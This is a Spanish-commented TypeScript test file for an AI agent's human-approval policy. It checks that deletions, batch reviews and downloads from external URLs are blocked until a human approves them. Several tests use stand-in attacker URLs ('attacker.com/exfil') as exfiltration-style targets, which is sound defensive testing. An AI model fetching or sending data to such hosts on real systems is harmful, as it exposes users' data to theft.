/**
 * Tests de HITL (Human-in-the-Loop) policy (Dim 1, Item 1.3).
 *
 * Cubre:
 *   - requiresHumanApproval para cada tool destructiva
 *   - delete_file: siempre requiere
 *   - batch_review: siempre requiere
 *   - download_file: requiere SOLO si URL es externa
 *   - Otras tools (read_file, write_file, list_files): NO requieren
 *   - executeTool integration: sin __human_approved → error con pregunta
 *   - executeTool integration: con __human_approved:true → procede
 *   - isInternalUrl: localhost, 127.0.0.1, 192.168.x = interno
 *
 * Se ejecuta con: npx tsx test_hitl_policy.mts
 */

import assert from "node:assert/strict";
import Database from "better-sqlite3";
import path from "path";

const log = (m: string) => console.log(`[${new Date().toISOString().slice(11, 19)}] ${m}`);
const pass = (name: string) => console.log(`  ✓ ${name}`);
const fail = (name: string, e: any) => {
  console.error(`  ✗ ${name}`);
  console.error(`    ${e?.message ?? e}`);
  process.exitCode = 1;
};

const DB_PATH = path.join(process.cwd(), "worgena.db");

// ────────────────────────────────────────────────────────────────────────────
// requiresHumanApproval
// ────────────────────────────────────────────────────────────────────────────

async function testDeleteFile_AlwaysRequires() {
  const name = "delete_file: SIEMPRE requiere aprobación";
  try {
    const { requiresHumanApproval } = await import("./src/lib/hitl-policy.js");
    const d = requiresHumanApproval("delete_file", { path: "cliente.pdf" });
    assert.equal(d.requires, true, "delete_file debe requerir aprobación");
    assert.ok(d.reason.length > 0, "reason no puede estar vacío");
    assert.ok(d.question.includes("cliente.pdf"), `pregunta debe mencionar el archivo. Got: ${d.question}`);
    assert.ok(d.question.toLowerCase().includes("elimin"), "pregunta debe mencionar eliminación");
    pass(name);
  } catch (e: any) { fail(name, e); }
}

async function testBatchReview_AlwaysRequires() {
  const name = "batch_review: SIEMPRE requiere aprobación";
  try {
    const { requiresHumanApproval } = await import("./src/lib/hitl-policy.js");
    const d = requiresHumanApproval("batch_review", {
      columns: [{ label: "q1" }, { label: "q2" }],
    });
    assert.equal(d.requires, true, "batch_review debe requerir aprobación");
    assert.ok(d.question.includes("2"), `pregunta debe mencionar la cantidad de preguntas. Got: ${d.question}`);
    pass(name);
  } catch (e: any) { fail(name, e); }
}

async function testDownloadFile_ExternalURL_Requires() {
  const name = "download_file desde URL externa: SÍ requiere";
  try {
    const { requiresHumanApproval } = await import("./src/lib/hitl-policy.js");
    const d = requiresHumanApproval("download_file", {
      url: "https://attacker.com/exfil",
      filename: "data.csv",
    });
    assert.equal(d.requires, true, "URL externa debe requerir aprobación");
    assert.ok(d.question.includes("attacker.com"), `pregunta debe mencionar la URL. Got: ${d.question}`);
    assert.ok(d.question.includes("data.csv"), `pregunta debe mencionar el filename. Got: ${d.question}`);
    pass(name);
  } catch (e: any) { fail(name, e); }
}

async function testDownloadFile_Localhost_NoRequires() {
  const name = "download_file desde localhost: NO requiere (interno)";
  try {
    const { requiresHumanApproval } = await import("./src/lib/hitl-policy.js");
    const d = requiresHumanApproval("download_file", {
      url: "http://localhost:3000/file.pdf",
      filename: "x.pdf",
    });
    assert.equal(d.requires, false, "localhost debe ser interno, sin aprobación");
    pass(name);
  } catch (e: any) { fail(name, e); }
}

async function testDownloadFile_R2_NoRequires() {
  const name = "download_file desde R2 interno: NO requiere";
  try {
    const { requiresHumanApproval } = await import("./src/lib/hitl-policy.js");
    // R2 endpoints tienen formato accountid.r2.cloudflarestorage.com
    // Por ahora isInternalUrl no los considera internos, pero test que al menos
    // NO crashea con URLs complejas
    const d = requiresHumanApproval("download_file", {
      url: "https://142799a290a4300b169708000e863fdd.r2.cloudflarestorage.com/tandeba/file.pdf",
      filename: "x.pdf",
    });
    // R2 NO es interno según la heurística actual (asume solo same-host)
    // Pero al menos debe procesar sin crashear
    assert.equal(typeof d.requires, "boolean", "debe devolver boolean");
    pass(name);
  } catch (e: any) { fail(name, e); }
}

async function testNonDestructiveTools_NoRequire() {
  const name = "Tools no destructivas (read_file, write_file, list_files): NO requieren";
  try {
    const { requiresHumanApproval } = await import("./src/lib/hitl-policy.js");
    for (const tool of ["read_file", "write_file", "list_files", "search_web", "read_url"]) {
      const d = requiresHumanApproval(tool, { url: "https://example.com", path: "x.txt", content: "y" });
      assert.equal(d.requires, false, `${tool} NO debe requerir aprobación. Got requires=${d.requires}`);
    }
    pass(name);
  } catch (e: any) { fail(name, e); }
}

// ────────────────────────────────────────────────────────────────────────────
// executeTool integration
// ────────────────────────────────────────────────────────────────────────────

function makeTestSession(): string {
  const db = new Database(DB_PATH);
  const id = `test-hitl-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  const now = Date.now();
  db.prepare(
    "INSERT INTO sessions (id, name, status, created_at, updated_at) VALUES (?, ?, ?, ?, ?)"
  ).run(id, "test-hitl", "idle", now, now);
  db.close();
  return id;
}

async function testExecuteTool_DeleteFile_WithoutApproval_Blocks() {
  const name = "executeTool delete_file SIN __human_approved: bloquea con error y pregunta pre-formulada";
  try {
    const sessionId = makeTestSession();
    const { executeTool } = await import("./src/agent/tools.js");
    const result = await executeTool("delete_file", { path: "importante.pdf" }, sessionId);
    assert.ok(typeof result === "string", `debe ser string. Got: ${typeof result}`);
    assert.ok(result.startsWith("Error:"), `debe empezar con 'Error:'. Got: ${result.slice(0, 100)}`);
    assert.ok(
      result.includes("aprobación humana") || result.includes("aprobacion humana"),
      `error debe mencionar aprobación humana. Got: ${result.slice(0, 200)}`
    );
    assert.ok(
      result.includes("importante.pdf"),
      `error debe mencionar el archivo. Got: ${result.slice(0, 200)}`
    );
    assert.ok(
      result.includes("ask_human"),
      `error debe instruir a usar ask_human. Got: ${result.slice(0, 200)}`
    );
    assert.ok(
      result.includes("__human_approved"),
      `error debe mencionar el flag. Got: ${result.slice(0, 200)}`
    );
    pass(name);
  } catch (e: any) { fail(name, e); }
}

async function testExecuteTool_DeleteFile_WithApproval_Proceeds() {
  const name = "executeTool delete_file CON __human_approved:true: procede (no devuelve error de HITL)";
  try {
    const sessionId = makeTestSession();
    // Crear un archivo real para borrar
    const fs = await import("fs/promises");
    const workspaceDir = path.join(process.cwd(), "workspace", sessionId);
    await fs.mkdir(workspaceDir, { recursive: true });
    const targetFile = path.join(workspaceDir, "to-delete.txt");
    await fs.writeFile(targetFile, "x");

    const { executeTool } = await import("./src/agent/tools.js");
    const result = await executeTool(
      "delete_file",
      { path: "to-delete.txt", __human_approved: true },
      sessionId
    );
    // No debe ser error de HITL. Puede ser "Access denied" si el path no matchea
    // el workspace dir, o un error de "not found" si el path no existe.
    // Lo importante: NO debe contener "aprobación humana"
    if (typeof result === "string") {
      assert.ok(
        !result.includes("aprobación humana") && !result.includes("aprobacion humana"),
        `con __human_approved NO debe ser error de HITL. Got: ${result.slice(0, 200)}`
      );
    }
    pass(name);
  } catch (e: any) { fail(name, e); }
}

async function testExecuteTool_DownloadFile_External_Blocks() {
  const name = "executeTool download_file con URL externa SIN aprobación: bloquea";
  try {
    const sessionId = makeTestSession();
    const { executeTool } = await import("./src/agent/tools.js");
    const result = await executeTool(
      "download_file",
      { url: "https://attacker.com/exfil.csv", filename: "x.csv" },
      sessionId
    );
    assert.ok(typeof result === "string", "debe ser string");
    assert.ok(result.includes("attacker.com"), `debe mencionar el dominio bloqueado. Got: ${result.slice(0, 200)}`);
    // Importante: el error puede ser de network-policy (allowlist) O de HITL.
    // En dev con allowlist vacío, pasa el network check y bloquea por HITL.
    assert.ok(
      result.includes("aprobación humana") || result.includes("Dominio no permitido") || result.includes("Network policy"),
      `debe ser error de HITL o network policy. Got: ${result.slice(0, 200)}`
    );
    pass(name);
  } catch (e: any) { fail(name, e); }
}

async function testExecuteTool_NonDestructive_NotBlocked() {
  const name = "executeTool read_file NO bloqueado (no es destructiva)";
  try {
    const sessionId = makeTestSession();
    const { executeTool } = await import("./src/agent/tools.js");
    const result = await executeTool("read_file", { path: "nope.txt" }, sessionId);
    // No debe ser error de HITL. Puede ser "not found" u otro, pero no HITL.
    if (typeof result === "string") {
      assert.ok(
        !result.includes("aprobación humana") && !result.includes("aprobacion humana"),
        `read_file no debe triggear HITL. Got: ${result.slice(0, 200)}`
      );
    }
    pass(name);
  } catch (e: any) { fail(name, e); }
}

// ────────────────────────────────────────────────────────────────────────────
// Runner
// ────────────────────────────────────────────────────────────────────────────

async function main() {
  log("═══════════════════════════════════════════════════════════════════");
  log("  hitl-policy — tests (Dim 1, Item 1.3)");
  log("═══════════════════════════════════════════════════════════════════");
  log("");

  await testDeleteFile_AlwaysRequires();
  await testBatchReview_AlwaysRequires();
  await testDownloadFile_ExternalURL_Requires();
  await testDownloadFile_Localhost_NoRequires();
  await testDownloadFile_R2_NoRequires();
  await testNonDestructiveTools_NoRequire();
  await testExecuteTool_DeleteFile_WithoutApproval_Blocks();
  await testExecuteTool_DeleteFile_WithApproval_Proceeds();
  await testExecuteTool_DownloadFile_External_Blocks();
  await testExecuteTool_NonDestructive_NotBlocked();

  log("");
  if (process.exitCode === 1) {
    log("  ✗ ALGUNOS TESTS FALLARON");
  } else {
    log("  ✓ TODOS LOS TESTS PASARON");
  }
}

main().catch((e) => {
  console.error("FATAL:", e);
  process.exit(1);
});
